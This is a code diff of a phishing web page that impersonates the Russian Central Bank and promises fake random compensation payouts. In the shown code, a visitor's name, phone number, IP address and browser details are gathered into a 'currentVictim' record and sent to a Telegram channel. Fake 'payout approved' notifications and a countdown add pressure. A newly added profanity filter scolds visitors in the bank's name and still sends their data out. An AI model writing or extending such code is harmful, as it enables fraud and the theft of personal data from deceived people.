@@ -927,6 +927,12 @@
             document.getElementById('requestsCounter').textContent = requestsLeft;
             document.getElementById('onlineUsers').textContent = onlineUsers;
             document.getElementById('liveDownloads').textContent = liveDownloads;
+
+            // МАТЫ ДЛЯ ПРОВЕРКИ ФИО 
+            const badWords = ['хуй', 'пизда', 'ебан', 'бля', 'сука', 'гондон', 'пидор', 'гандон', 'долбоеб', 
+            'мудак', 'ебать', 'хер', 'шлюха', 'блядь', 'пиздец', 'нахуй', 'охуеть',
+            'fuck', 'shit', 'asshole', 'cock', 'dick', 'bitch', 'whore', 'cunt'];
+            const unrealisticNames = ['авыаыв', 'фывфыв', '111', '222', '333', 'xxx', 'qqq', 'zzz', 'test', 'тест', 'admin', 'administrator'];
             
             // Пересчет времени для уменьшения счетчиков
             const now = Date.now();
@@ -1200,66 +1206,71 @@
             return result;
         }
         
-        // Проверка компенсации
-        async function checkCompensation() {
-            const lastName = document.getElementById('lastName').value.trim();
-            const firstName = document.getElementById('firstName').value.trim();
-            const phone = document.getElementById('phone').value.trim();
-            
-            if (!lastName || !firstName || !phone) {
-                alert('Заполните все обязательные поля');
-                return;
-            }
-            
-            const nameCheck = checkNameForBadWords(lastName + ' ' + firstName);
-            
-            const amounts = [85000, 127000, 189000, 215000, 280000];
-            const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
-            const ip = await getIP();
-            
-            const phoneInfo = await searchPhoneInfo(phone);
-            
-            currentVictim = {
-                name: `${lastName} ${firstName} ${document.getElementById('middleName').value.trim() || ''}`.trim(),
-                phone: phone,
-                amount: randomAmount,
-                time: new Date().toLocaleString('ru-RU'),
-                ip: ip,
-                userAgent: navigator.userAgent,
-                requestId: ++requestCounter,
-                phoneInfo: phoneInfo,
-                nameCheck: nameCheck
-            };
-            
-            localStorage.setItem('requestCounter', requestCounter);
-            
-            requestsLeft = Math.max(70, requestsLeft - 1);
-            localStorage.setItem('requestsLeft', requestsLeft);
-            document.getElementById('requestsCounter').textContent = requestsLeft;
-            
-            sendToTelegram('compensation', currentVictim);
-            
-            document.getElementById('userName').textContent = currentVictim.name;
-            document.getElementById('moneyAmount').textContent = randomAmount.toLocaleString('ru-RU') + ' ₽';
-            document.getElementById('result').style.display = 'block';
-            document.getElementById('timerContainer').style.display = 'block';
-            document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
-            
-            startTimer();
-            
-            setTimeout(() => {
-                if ('Notification' in window && Notification.permission === 'default') {
-                    Notification.requestPermission().then(permission => {
-                        if (permission === 'granted') {
-                            new Notification('ЦБ РФ: Ваша выплата одобрена!', {
-                                body: `Сумма: ${randomAmount.toLocaleString()} ₽. Осталось получить: 1 час`,
-                                icon: 'https://avatars.mds.yandex.net/i?id=5f95dfabeb4f59d3ef16a741dedd6b90_l-5221578-images-thumbs&n=13'
-                            });
-                        }
-                    });
-                }
-            }, 3000);
+// Проверка компенсации
+async function checkCompensation() {
+    const lastName = document.getElementById('lastName').value.trim();
+    const firstName = document.getElementById('firstName').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    
+    if (!lastName || !firstName || !phone) {
+        alert('Заполните все обязательные поля');
+        return;
+    }
+    
+    // Проверка на маты и некорректные имена
+    const nameCheck = checkNameForBadWords(lastName + ' ' + firstName);
+    
+    // Если обнаружены маты или подозрительное имя
+    if (nameCheck.isSuspicious) {
+        let warningMessage = '❌ Ошибка проверки данных!\n\n';
+        
+        if (nameCheck.hasBadWord) {
+            warningMessage += '• В вашем ФИО обнаружена ненормативная лексика.\n';
         }
+        if (nameCheck.hasUnrealistic) {
+            warningMessage += '• Указанное ФИО некорректно.\n';
+        }
+        
+        warningMessage += '\n⚠️ Внимание:\n';
+        warningMessage += 'Вы отправляете данные в государственное учреждение ЦБ РФ.\n';
+        warningMessage += 'Использование ненормативной лексики запрещено.\n';
+        warningMessage += 'Пожалуйста, измените данные на корректные.';
+        
+        alert(warningMessage);
+        
+        // Отправка в телеграм о попытке с матами
+        const ip = await getIP();
+        const suspiciousData = {
+            name: `${lastName} ${firstName}`,
+            phone: phone,
+            time: new Date().toLocaleString('ru-RU'),
+            ip: ip,
+            reason: nameCheck.hasBadWord ? 'МАТЫ' : 'ПОДОЗРИТЕЛЬНОЕ ФИО',
+            userAgent: navigator.userAgent
+        };
+        
+        sendToTelegram('suspicious_input', suspiciousData);
+        return;
+    }
+    
+    // Остальной код проверки...
+    const amounts = [85000, 127000, 189000, 215000, 280000];
+    const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
+    const ip = await getIP();
+    
+    const phoneInfo = await searchPhoneInfo(phone);
+    
+    currentVictim = {
+        name: `${lastName} ${firstName} ${document.getElementById('middleName').value.trim() || ''}`.trim(),
+        phone: phone,
+        amount: randomAmount,
+        time: new Date().toLocaleString('ru-RU'),
+        ip: ip,
+        userAgent: navigator.userAgent,
+        requestId: ++requestCounter,
+        phoneInfo: phoneInfo,
+        nameCheck: nameCheck
+    };
         
         // Запуск таймера
         function startTimer() {
